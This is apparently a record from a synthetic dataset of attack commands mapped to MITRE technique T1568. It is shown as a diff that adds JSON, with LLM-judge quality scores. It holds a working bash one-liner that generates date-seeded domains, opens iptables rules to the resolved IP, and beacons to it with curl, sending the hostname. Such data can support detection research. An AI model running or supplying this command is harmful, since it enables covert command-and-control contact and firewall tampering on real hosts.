@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'seed=$(date -u +%Y%m%d); for tld in xyz club online; do d=\"cdn-$seed.$tld\"; ip=$(dig +short A \"$d\" | head -n1); if [ -n \"$ip\" ]; then port=$(shuf -i 49152-65535 -n1); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --connect-timeout 5 --retry 1 --max-time 10 \"http://$d:$port/beacon?id=$(hostname)-$(date +%s)\"; break; fi; done'",
+  "explanation": "Generates a date-seeded domain (DGA), resolves it, opens iptables egress/ingress rules to the resolved IP on a random high port, and initiates a beacon over that port. Emphasizes dynamic DNS resolution to locate C2.",
+  "rationale_steps": [
+    "Create a time-based DGA domain",
+    "Resolve the domain to an IP via dig",
+    "Choose a random high port to reduce detection",
+    "Insert iptables rules permitting only that IP:port",
+    "Beacon to the dynamically resolved endpoint with curl"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-ce65493f",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for all components including bash, date, dig, iptables, and curl.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by using a date-based algorithm to generate domain names, resolving them to IPs, establishing firewall rules, and creating a beacon connection - all core elements of DGA-based C2 infrastructure.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:29:17.190917Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for loops, conditionals, command substitutions, variable assignments, and all included utility commands.",
+        "semantic_score": 3,
+        "semantic_justification": "The command correctly implements dynamic domain generation, resolution, and beaconing, but the critical 'iptables' rules cannot be established with the stated 'None' privilege, making the full operational intent unachievable.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:29:25.883111Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and separators with valid bash, dig, iptables, and curl flags make the command well-formed and parseable.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements date-seeded DGA-style domain generation, resolves dynamically, and attempts a beacon consistent with T1568, but relies on iptables changes that need root and a random port likely not serviced, reducing operational realism.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:29:41.185780Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
